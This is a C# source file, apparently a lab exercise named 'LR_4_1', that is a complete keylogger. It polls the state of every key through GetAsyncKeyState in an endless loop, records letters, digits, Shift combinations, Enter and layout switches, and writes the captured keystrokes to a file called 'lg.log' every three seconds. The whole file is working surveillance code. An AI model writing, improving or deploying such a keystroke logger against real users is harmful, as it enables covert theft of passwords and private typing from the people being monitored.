using System;
using System.Windows.Forms;
using System.IO;
using System.Text;

namespace LR_4_1
{
    class Program
    {
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static public bool ShiftPushed()
        {
            return  (GetAsyncKeyState(16) != 0)     ||
                    (GetAsyncKeyState(160) != 0)    ||
                    (GetAsyncKeyState(161) != 0);
        }

        static public bool AltPushed()
        {
            return  (GetAsyncKeyState(18) != 0)     ||
                    (GetAsyncKeyState(164) != 0)    ||
                    (GetAsyncKeyState(165) != 0);
        }

        static void Main()
        {
            StringBuilder buf = new StringBuilder();

            DateTime timer = DateTime.Now;

            while (true)
            {
                if (ShiftPushed())
                {
                    while (ShiftPushed())
                    {
                        for (ushort j = 0; j < 255; j++)
                        {
                            if (GetAsyncKeyState(j) != 0 && j != 160 && j != 161 && j != 16)
                            {
                                while (GetAsyncKeyState(j) != 0) { };
                                if (j >= 65 && j <= 90)
                                {
                                    buf.Append((Keys)j);
                                }
                                else if (j >= 48 && j <= 57)
                                {
                                    buf.Append($"<Shift + {(char)j}>");
                                }
                                else if (j == 13)
                                {
                                    buf.Append("\n");
                                }
                                else
                                {
                                    buf.Append($"<Shift + {(Keys)j}>");
                                }
                            }
                        }
                    }
                }
                else if (AltPushed())
                {
                    if (AltPushed() && ShiftPushed())
                    {
                        while (ShiftPushed()) { };
                        buf.Append("<layout change>");
                    }
                }
                else
                {
                    for (ushort i = 0; i < 255; i++)
                    {
                        if (GetAsyncKeyState(i) != 0)
                        {
                            while (GetAsyncKeyState(i) != 0) { };
                            if (i >= 65 && i <= 90)
                            {
                                buf.Append((char)(i + 32));
                            }
                            else if (i >= 48 && i <= 57)
                            {
                                buf.Append((char)i);
                            }
                            else if (i == 32)
                            {
                                buf.Append(" ");
                            }
                            else if (i == 13)
                            {
                                buf.Append("<Enter>");
                            }
                            else
                            {
                                buf.Append($"{(Keys)i}");
                            }
                        }
                    }
                }

                if (TimePassedFrom(timer) > 3)
                {
                    File.AppendAllText("lg.log", buf.ToString());
                    buf.Clear();
                    timer = DateTime.Now;
                }
            }
        }

        static double TimePassedFrom(DateTime timer)
        {
            TimeSpan now = timer - DateTime.Now;
            return (now.Hours * 3600 + now.Minutes * 60 + now.Seconds + (double)now.Milliseconds / 1000) * ((now < TimeSpan.Zero) ? (-1) : (1));
        }
    }
}